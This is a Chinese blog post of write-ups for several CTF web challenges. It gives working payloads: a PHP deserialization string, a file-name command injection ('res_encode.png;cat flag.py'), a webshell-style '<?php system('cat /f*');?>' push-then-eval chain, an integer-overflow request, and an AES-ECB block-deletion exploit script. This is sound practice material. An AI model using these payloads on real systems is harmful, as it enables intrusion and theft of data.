<h2 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;好多零&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想var_dump出$flag，必须要让<code>$_GET=$flag</code> &#x3D;&gt; <code>$key=_GET,$value=flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure>

<h2 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309110030471.png" alt="image-20230910234931585"></p>
<p>有两组，FP&#x3D;1024-count*score，得分&#x3D;count*score</p>
<p>看了一下wp，考的是php整形溢出，就只需要先让count取922337203685477580，让后部分溢出为负数，就可以使得整体的FP&gt;114514，在正常买就能让得分&gt;114514</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#post 发两次就可以了</span><br><span class="line">#不知道为什么但一个e不行，得多加两个参数</span><br><span class="line">a=152000&amp;b=0&amp;c=0&amp;d=0&amp;e=922337203685477580&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>

<h2 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;月亮&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;牛夫人&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\n&quot;;</span><br><span class="line">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<p>印象里做过这个，但具体找不到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h2><p>被误导了，以为tsteg.py不但能解密LSB，还能执行其中语句，结果只有解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/10/20 15:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：TSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>

<p><code>result=os.popen(&quot;python3 tsteg.py upload/...;cat flag.py&quot;).read()</code></p>
<p>返回的就是python+cat的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;res_encode.png;cat flag.py&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h2><p>题目奇怪</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111335252.png" alt="image-20230911133522177"></p>
<p>会执行decode之后的input参数，而且robots.txt里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /lib.php?flag=0</span><br><span class="line">Disallow: /plugins</span><br></pre></td></tr></table></figure>

<p>传入flag&#x3D;1，得到</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111337834.png" alt="image-20230911133708811"></p>
<p>上面一串O0估计表示加密什么东西，下面的估计就是密文</p>
<p>结合上面的decode，把这一串传入到input中，把action改为test执行，还得url编码一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>可以看出要先传入output，把文件写到.&#x2F;plugins目录下，文件名是md5后的结果</p>
<p>然后eval执行.&#x2F;plugins&#x2F;文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?input=&amp;action=push&amp;output=&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br><span class="line">?input=2e487432444053a0e4c42d08e42016a8&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure>

<h2 id="龙珠NFT"><a href="#龙珠NFT" class="headerlink" title="龙珠NFT"></a>龙珠NFT</h2><p>完全没思路，玩不明白crypto，直接看wp</p>
<p>根据源码可知，address是用AES的ECB模式加密的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112009132.png" alt="image-20230911200947045"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class AESCipher():</span><br><span class="line">    def __init__(self,key):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:16])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br></pre></td></tr></table></figure>

<p>而明文分组长度是16位，当一组明文相等时，加密后的密文也应该相等</p>
<p>而返回的数值按16位分组后的结果就是</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112027617.png" alt="image-20230911202754589"></p>
<p>显然round_no是一直递增的，思路就是删掉其中64-80这一行，这就让dragonball随着次数的增加而增加</p>
<p>wp给的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url=<span class="string">&#x27;http://xxxxxxxxxxxxxxxxxxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">username=<span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r=s.get(url+<span class="string">&#x27;?username=&#x27;</span>+username)</span><br><span class="line">responses=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r=s.get(url+<span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">        responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">	data=json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>:item[<span class="string">&#x27;player_id&#x27;</span>],<span class="string">&#x27;dragonball&#x27;</span>:item[<span class="string">&#x27;dragonball&#x27;</span>],<span class="string">&#x27;round_no&#x27;</span>:item[<span class="string">&#x27;round_no&#x27;</span>],<span class="string">&#x27;time&#x27;</span>:item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">        miwen=base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">        round_no=item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> round_no <span class="keyword">in</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>)]:</span><br><span class="line">                fake_address=miwen[:<span class="number">64</span>]+miwen[<span class="number">80</span>:]</span><br><span class="line">                fake_address=base64.b64encode(fake_address).decode()</span><br><span class="line">                r=s.get(url+<span class="string">&#x27;get_dragonball&#x27;</span>,params=&#123;<span class="string">&quot;address&quot;</span>:fake_address&#125;)</span><br><span class="line"></span><br><span class="line">r=s.get(url+<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/09/%E8%8F%9C%E7%8B%97%E6%9D%AF/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag">题解</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
    
      <a href="/2023/04/25/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">PHP伪协议</div>
      </a>
    
  </nav>

  
   
  
   
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2023
        <i class="ri-heart-fill heart_icon"></i> b1xcy
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i></p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>